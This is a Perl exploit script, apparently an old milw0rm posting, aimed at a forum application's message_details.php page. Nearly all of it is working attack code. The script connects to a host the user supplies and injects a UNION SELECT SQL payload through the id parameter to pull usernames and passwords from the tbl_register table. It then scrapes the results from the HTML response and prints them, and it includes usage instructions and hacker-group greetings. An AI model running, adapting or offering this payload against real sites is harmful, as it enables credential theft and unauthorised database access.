#!perl
use IO::Socket;
#Download:http://www.thewebdrivers.com/forum.zip
#By:Bl0od3r
#Germany =]
if (@ARGV<3) {
&header;
} else {
&get();
}
sub get() {
$host=$ARGV[0];
$path=$ARGV[1];
   $id=$ARGV[2];
$socket=IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$host",PeerPort=>80)
or die ("[-]Error\n");
print "[~]Connecting!\n";
print "[~]Getting Data!\n";
print $socket "GET ".$path."message_details.php?id=-1%20UNION%20SELECT%201,password,username,4,4%20FROM%20tbl_register WHERE id=".$id."/* HTTP/1.1\n";
print $socket "Host: $host\n";
print $socket "Accept: */*\n";
print $socket "Connection: close\n\n";

while ($ans=<$socket>) {
$ans=~ m/<span class="style3">&nbsp;Re :  -(.*?)-/ && print "--------------------------------------------\n[+]UserName: $1\n[+]PassWord:";
$ans=~ m/<td class=\"text\">(.*?)<\/td>/ && print "$1\n";
if ($1) {
$success=1; } else { $success=0;};
}
if ($success=="1") {
print "\n[+]Successed!";
  } else {
print "[-]Error";
    }
  }
sub header() {
print
"--------------------------------------------------------------------\n";
print "|\t---------->By Bl0od3r<---------\t\t\t\t    |";
print "\n|Usage:script.pl host.com /path/ 1\t\t\t\t    |";
print
"\n--------------------------------------------------------------------\n";
exit;
}

# greetz to all dc3 members,matrix_killer and skOd =]

# milw0rm.com [2006-11-05]
